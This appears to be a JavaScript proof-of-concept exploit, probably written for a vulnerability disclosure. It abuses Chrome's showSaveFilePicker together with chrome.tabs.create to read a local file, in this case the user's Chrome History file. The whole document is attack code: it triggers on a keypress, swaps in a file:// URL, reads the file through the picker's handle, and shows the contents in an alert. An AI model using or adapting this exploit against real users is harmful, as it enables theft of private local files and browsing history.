// File to steal here:
var filename = "file:///C:/Users/User/AppData/Local/Google/Chrome/User%20Data/Default/History"

trigger = false;

document.onkeydown = function () {
  if (trigger) return;
  handle = getFileHandle();
  setTimeout(() => swap(handle), 500)
}

function swap(handle) {
  chrome.tabs.create({url: filename})
  setTimeout(() => steal(handle), 500)
}

function steal(handle) {
  file = handle.then(function(filehandle) { return filehandle.getFile() })
  contents = file.then(function(file) {return file.text()})
  contents.then(function(contents) {alert(contents)});
}

function getFileHandle() {
  trigger = true;
  name = new URL(filename).pathname.split('/').pop();
  const opts = {
    suggestedName: name,
    startIn: 'downloads'
  };
  return window.showSaveFilePicker(opts);
}